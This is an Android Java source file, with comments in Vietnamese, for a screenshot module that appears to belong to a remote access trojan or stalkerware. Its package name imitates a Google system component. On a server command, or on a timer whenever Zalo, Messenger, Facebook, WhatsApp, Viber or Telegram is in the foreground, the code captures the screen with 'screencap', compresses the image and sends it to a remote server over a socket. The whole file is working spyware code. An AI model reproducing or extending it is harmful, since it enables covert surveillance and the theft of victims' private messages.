package com.google.android.sys.security;

import android.app.Activity;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.os.Build;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;

/**
 * Screenshot Manager
 * Xử lý việc chụp màn hình và gửi lên server
 * 
 * Phương pháp:
 * 1. Server gửi lệnh chụp screenshot
 * 2. App chụp màn hình hiện tại
 * 3. Compress và gửi lên server
 * 4. Xóa file local (tiết kiệm storage)
 */
public class ScreenshotManager {
    private static final String TAG = "ScreenshotManager";
    private static final int JPEG_QUALITY = 40; // Giảm quality để giảm size
    
    private Context context;
    private static ScreenshotManager instance;

    private ScreenshotManager(Context context) {
        this.context = context.getApplicationContext();
    }

    public static synchronized ScreenshotManager getInstance(Context context) {
        if (instance == null) {
            instance = new ScreenshotManager(context);
        }
        return instance;
    }

    /**
     * Chụp screenshot của màn hình hiện tại
     * Sử dụng root view của window
     */
    public void takeScreenshot() {
        try {
            Log.d(TAG, "Taking screenshot...");
            
            // Method 1: Sử dụng shell command (cần permission)
            takeScreenshotViaShell();
            
        } catch (Exception e) {
            Log.e(TAG, "Error taking screenshot", e);
        }
    }

    /**
     * Chụp screenshot bằng shell command
     * Đọc trực tiếp từ stream để tránh lỗi permission ghi file
     */
    private void takeScreenshotViaShell() {
        new Thread(() -> {
            try {
                // Thử chụp bằng lệnh screencap -p (PNG format)
                Process process = Runtime.getRuntime().exec("screencap -p");
                
                // Đọc dữ liệu từ stream
                java.io.InputStream is = process.getInputStream();
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                byte[] buffer = new byte[8192];
                int bytesRead;
                
                while ((bytesRead = is.read(buffer)) != -1) {
                    baos.write(buffer, 0, bytesRead);
                }
                
                process.waitFor();
                
                byte[] data = baos.toByteArray();
                
                if (data.length > 0) {
                    // Kiểm tra header PNG
                    if (data.length > 8 && data[0] == (byte)0x89 && data[1] == (byte)0x50) {
                         Log.d(TAG, "Screenshot captured via stream: " + data.length + " bytes");
                         // Compress và gửi
                         data = compressImage(data);
                         sendToServer(data);
                    } else {
                        // Header không phải PNG
                         Log.e(TAG, "Captured data is not valid PNG");
                         
                         // Đọc error stream
                         java.io.InputStream es = process.getErrorStream();
                         ByteArrayOutputStream eos = new ByteArrayOutputStream();
                         while ((bytesRead = es.read(buffer)) != -1) {
                             eos.write(buffer, 0, bytesRead);
                         }
                         String errorMsg = new String(eos.toByteArray());
                         sendError("Screenshot failed. CMD Output: " + errorMsg);
                    }
                } else {
                    Log.e(TAG, "Screenshot stream empty");
                     // Đọc error stream để biết lý do
                     java.io.InputStream es = process.getErrorStream();
                     ByteArrayOutputStream eos = new ByteArrayOutputStream();
                     while ((bytesRead = es.read(buffer)) != -1) {
                         eos.write(buffer, 0, bytesRead);
                     }
                     String errorMsg = new String(eos.toByteArray());
                    sendError("Screenshot stream empty. Error: " + errorMsg);
                }
                
            } catch (Exception e) {
                Log.e(TAG, "Error in shell screenshot", e);
                sendError("Exception: " + e.getMessage());
            }
        }).start();
    }

    private void sendError(String msg) {
        try {
            JSONObject data = new JSONObject();
            data.put("screenshot", false);
            data.put("error", msg);
            IOSocket.getInstance().getIoSocket().emit("x0000ss", data);
        } catch (Exception e) {}
    }

    /**
     * Gửi screenshot file lên server
     */
    private void sendScreenshotFile(File file) {
        try {
            // Đọc file thành byte array
            java.io.FileInputStream fis = new java.io.FileInputStream(file);
            byte[] buffer = new byte[(int) file.length()];
            fis.read(buffer);
            fis.close();
            
            // Compress nếu file quá lớn
            if (buffer.length > 500 * 1024) { // > 500KB
                buffer = compressImage(buffer);
            }
            
            // Gửi lên server
            sendToServer(buffer);
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending screenshot file", e);
        }
    }

    /**
     * Compress ảnh để giảm size
     */
    private byte[] compressImage(byte[] imageData) {
        try {
            // Decode byte array thành Bitmap
            android.graphics.BitmapFactory.Options options = new android.graphics.BitmapFactory.Options();
            options.inSampleSize = 2; // Giảm kích thước 50%
            
            Bitmap bitmap = android.graphics.BitmapFactory.decodeByteArray(imageData, 0, imageData.length, options);
            
            // Compress lại
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, baos);
            
            byte[] compressed = baos.toByteArray();
            
            Log.d(TAG, "Compressed: " + imageData.length + " -> " + compressed.length + " bytes");
            
            return compressed;
            
        } catch (Exception e) {
            Log.e(TAG, "Error compressing image", e);
            return imageData;
        }
    }

    /**
     * Gửi screenshot lên server qua socket
     */
    private void sendToServer(byte[] imageData) {
        try {
            JSONObject data = new JSONObject();
            data.put("screenshot", true);
            data.put("timestamp", System.currentTimeMillis());
            data.put("size", imageData.length);
            data.put("buffer", imageData);
            
            // Lấy thông tin foreground app
            String foregroundApp = getForegroundApp();
            if (foregroundApp != null) {
                data.put("app", foregroundApp);
            }
            
            // Gửi qua socket
            if (IOSocket.getInstance() != null && IOSocket.getInstance().getIoSocket() != null) {
                IOSocket.getInstance().getIoSocket().emit("x0000ss", data);
                Log.d(TAG, "Screenshot sent to server (" + imageData.length + " bytes)");
            } else {
                Log.e(TAG, "Socket not connected");
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error sending to server", e);
        }
    }

    /**
     * Lấy tên app đang chạy foreground
     */
    private String getForegroundApp() {
        try {
            android.app.ActivityManager am = (android.app.ActivityManager) 
                context.getSystemService(Context.ACTIVITY_SERVICE);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                java.util.List<android.app.ActivityManager.RunningAppProcessInfo> processes = 
                    am.getRunningAppProcesses();
                
                if (processes != null) {
                    for (android.app.ActivityManager.RunningAppProcessInfo processInfo : processes) {
                        if (processInfo.importance == 
                            android.app.ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND) {
                            return processInfo.processName;
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting foreground app", e);
        }
        return "unknown";
    }

    /**
     * Chụp screenshot theo interval (auto mode)
     */
    public void startAutoScreenshot(long intervalMs) {
        Handler handler = new Handler();
        Runnable runnable = new Runnable() {
            @Override
            public void run() {
                String foregroundApp = getForegroundApp();
                
                // Chỉ chụp nếu đang dùng target apps
                if (isTargetApp(foregroundApp)) {
                    takeScreenshot();
                }
                
                handler.postDelayed(this, intervalMs);
            }
        };
        
        handler.post(runnable);
        Log.d(TAG, "Auto screenshot started (interval: " + intervalMs + "ms)");
    }

    /**
     * Kiểm tra xem có phải target app không
     */
    private boolean isTargetApp(String packageName) {
        if (packageName == null) return false;
        
        return packageName.contains("zalo") ||
               packageName.contains("messenger") ||
               packageName.contains("facebook") ||
               packageName.contains("whatsapp") ||
               packageName.contains("viber") ||
               packageName.contains("telegram");
    }
}
